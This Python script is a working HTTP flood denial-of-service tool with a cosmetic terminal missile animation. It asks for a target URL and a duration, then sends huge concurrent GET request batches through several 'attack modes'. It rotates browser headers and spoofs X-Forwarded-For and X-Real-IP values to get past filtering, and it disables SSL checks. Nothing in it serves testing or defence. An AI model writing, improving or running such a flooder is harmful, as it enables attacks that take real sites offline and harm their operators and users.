import asyncio
import aiohttp
import random
import time
import os
import shutil
import psutil

# Terminal size
TERMINAL_SIZE = shutil.get_terminal_size((80, 40))
TERMINAL_WIDTH = TERMINAL_SIZE.columns
TERMINAL_HEIGHT = TERMINAL_SIZE.lines - 2

# Clear terminal
def clear():
    print("\033[H\033[J", end="")

# Generate random real-looking IPv4
def random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

# Countdown loader with random IPs
async def countdown_loader(seconds):
    for i in range(seconds, 0, -1):
        clear()
        print(f"SG - RELOADING | {i}s")
        for _ in range(5):
            print(random_ip())
        await asyncio.sleep(1)

# Small missile body
MISSILE_BODY = [
"  /\\  ",
" |=|  ",
" |=|  ",
" |=|  ",
" |=|  "
]

# Exhaust colors
EXHAUST_FRAMES = [
    "\033[31m ^^^ \033[0m",
    "\033[33m *** \033[0m",
    "\033[91m !!! \033[0m",
    "\033[93m ::: \033[0m"
]

# Dynamic batch sizes based on system resources
def get_dynamic_batch_size(missile_type):
    # Get system resources
    cpu_percent = psutil.cpu_percent(interval=0.1)
    memory = psutil.virtual_memory()
    memory_percent = memory.percent
    
    # Base sizes for each missile type
    base_sizes = {
        1: 1000,   # Light missile - high frequency
        2: 5000,   # Medium missile
        3: 10000,  # Heavy missile
        4: 25000,  # Super missile
        5: 50000   # Ultra missile - maximum power
    }
    
    base_size = base_sizes.get(missile_type, 1000)
    
    # Adjust based on available resources
    if cpu_percent < 50 and memory_percent < 70:
        # System has plenty of resources - go aggressive
        multiplier = 3.0
    elif cpu_percent < 80 and memory_percent < 85:
        # System has moderate resources
        multiplier = 2.0
    else:
        # System is stressed - be conservative
        multiplier = 1.0
    
    # Type 5 (Ultra) gets extra boost if resources allow
    if missile_type == 5 and cpu_percent < 60 and memory_percent < 75:
        multiplier *= 1.5
    
    dynamic_size = int(base_size * multiplier)
    
    # Cap extremely high values
    max_sizes = {
        1: 5000,
        2: 15000,
        3: 30000,
        4: 60000,
        5: 100000
    }
    
    return min(dynamic_size, max_sizes[missile_type])

# Global request counter
total_requests = 0
requests_lock = asyncio.Lock()

class Missile:
    def __init__(self, speed=None):
        self.reset(speed)

    def reset(self, speed=None):
        if speed:
            self.speed = speed
        else:
            self.speed = random.choice([1, 2, 3, 4, 5])
        
        self.batch = get_dynamic_batch_size(self.speed)
        self.x = TERMINAL_WIDTH // 2 - len(MISSILE_BODY[0]) // 2
        self.y = TERMINAL_HEIGHT
        self.active = False
        self.launch_delay = random.uniform(0.5, 2)  # Faster launches
        self.exhaust = random.choice(EXHAUST_FRAMES)
        self.requests_sent = 0
        self.last_batch_time = 0

    def move(self):
        if self.active:
            self.y -= self.speed
            if self.y < -len(MISSILE_BODY):
                self.reset()
                self.active = False

# Draw missiles with dynamic batch sizes and system info
def draw_missiles(missiles):
    global total_requests
    
    # Get system info
    cpu_percent = psutil.cpu_percent(interval=0.1)
    memory = psutil.virtual_memory()
    memory_percent = memory.percent
    
    buffer = [""] * TERMINAL_HEIGHT
    
    # System info at top
    buffer[0] = f"CPU: {cpu_percent:.1f}% | MEM: {memory_percent:.1f}% | REQS: {total_requests}"
    buffer[1] = "=" * TERMINAL_WIDTH
    
    for missile in missiles:
        if missile.active:
            for i, line in enumerate(MISSILE_BODY):
                pos = missile.y - len(MISSILE_BODY) + i + 2  # Offset for system info
                if 0 <= pos < TERMINAL_HEIGHT:
                    if i == 0:
                        buffer[pos] += " " * missile.x + line + f"  [T{missile.speed}:{missile.batch}]"
                    else:
                        buffer[pos] += " " * missile.x + line
            exhaust_pos = missile.y + 2  # Offset for system info
            if 0 <= exhaust_pos < TERMINAL_HEIGHT:
                buffer[exhaust_pos] += " " * missile.x + random.choice(EXHAUST_FRAMES)
    
    clear()
    print("\n".join(buffer))

# Minimal headers for bypass
def get_headers():
    headers_list = [
        {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        },
        {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Connection': 'keep-alive'
        },
        {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Accept': '*/*',
            'Connection': 'keep-alive'
        }
    ]
    return random.choice(headers_list)

# Send batch requests with maximum efficiency
async def send_requests(target, batch, missile=None):
    global total_requests
    
    connector = aiohttp.TCPConnector(limit=0, verify_ssl=False, use_dns_cache=True)
    timeout = aiohttp.ClientTimeout(total=15)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = []
        for i in range(batch):
            try:
                headers = get_headers()
                # Add some variation to headers
                if i % 3 == 0:
                    headers['X-Forwarded-For'] = random_ip()
                elif i % 5 == 0:
                    headers['X-Real-IP'] = random_ip()
                
                task = session.get(
                    target, 
                    headers=headers,
                    allow_redirects=True, 
                    ssl=False,
                    skip_auto_headers=['Accept-Encoding']  # Reduce overhead
                )
                tasks.append(task)
            except Exception as e:
                continue
        
        try:
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            successful = sum(1 for r in responses if not isinstance(r, Exception))
            
            async with requests_lock:
                total_requests += successful
            
            if missile:
                missile.requests_sent += successful
            
            return successful
        except Exception as e:
            return 0

# Continuous attack functions for each missile type
async def send_continuous_requests(target, missile):
    missile.requests_sent = 0
    flight_time = (TERMINAL_HEIGHT + len(MISSILE_BODY)) / missile.speed * 0.05
    
    start_time = time.time()
    
    while time.time() - start_time < flight_time and missile.active:
        # Dynamic batch size adjustment during flight
        missile.batch = get_dynamic_batch_size(missile.speed)
        
        # Send requests based on missile type
        if missile.speed == 1:  # High frequency, smaller batches
            batch_size = max(100, missile.batch // 10)
            interval = 0.001  # 1ms
        elif missile.speed == 2:  # Balanced
            batch_size = max(500, missile.batch // 5)
            interval = 0.002
        elif missile.speed == 3:  # Heavy
            batch_size = max(1000, missile.batch // 3)
            interval = 0.005
        elif missile.speed == 4:  # Super
            batch_size = max(2000, missile.batch // 2)
            interval = 0.01
        else:  # Ultra (Type 5) - Maximum power
            batch_size = missile.batch
            interval = 0.02  # Larger batches, slightly longer intervals
        
        batch_start = time.time()
        successful = await send_requests(target, batch_size, missile)
        
        # Adaptive timing based on performance
        batch_duration = time.time() - batch_start
        if successful > 0 and batch_duration < interval:
            # We can go faster
            interval = max(0.0005, batch_duration * 0.8)
        
        sleep_time = max(0, interval - batch_duration)
        if sleep_time > 0:
            await asyncio.sleep(sleep_time)

# Special attack modes
async def ultra_super_missile(target, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        batch = get_dynamic_batch_size(4) * 3  # Triple super missile power
        asyncio.create_task(send_requests(target, batch))
        await asyncio.sleep(3)  # More frequent

async def last_missile(target, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        batch = get_dynamic_batch_size(5) // 2  # Half ultra missile power but frequent
        asyncio.create_task(send_requests(target, batch))
        await asyncio.sleep(0.1)  # Very frequent

async def supernova_missile(target, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        delay = random.uniform(2, 5)  # More frequent supernovas
        await asyncio.sleep(delay)

        # Massive initial burst
        initial_batch = get_dynamic_batch_size(5) * 5
        asyncio.create_task(send_requests(target, initial_batch))

        # Continuous stream
        async def stream():
            t_end = time.time() + 3  # Longer stream
            while time.time() < t_end:
                stream_batch = get_dynamic_batch_size(3)
                asyncio.create_task(send_requests(target, stream_batch))
                await asyncio.sleep(0.0005)  # Very high frequency
        asyncio.create_task(stream())

# Main loop
async def main():
    global total_requests
    
    target = input("¿TARGZ > ")
    duration = int(input("¿DU > "))

    await countdown_loader(5)

    # Create missiles of all types
    missiles = [Missile(i+1) for i in range(5)]  # One of each type

    # Start special attack modes
    asyncio.create_task(ultra_super_missile(target, duration))
    asyncio.create_task(last_missile(target, duration))
    asyncio.create_task(supernova_missile(target, duration))

    start_time = time.time()
    last_launch_times = [0] * len(missiles)

    while time.time() - start_time < duration:
        now = time.time()
        for idx, missile in enumerate(missiles):
            if not missile.active and now - last_launch_times[idx] >= missile.launch_delay:
                missile.active = True
                last_launch_times[idx] = now
                
                # Update batch size based on current resources
                missile.batch = get_dynamic_batch_size(missile.speed)
                
                # All missiles use continuous attack now
                asyncio.create_task(send_continuous_requests(target, missile))
            
            missile.move()
        
        draw_missiles(missiles)
        await asyncio.sleep(0.03)  # Faster update for smoother animation

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        clear()
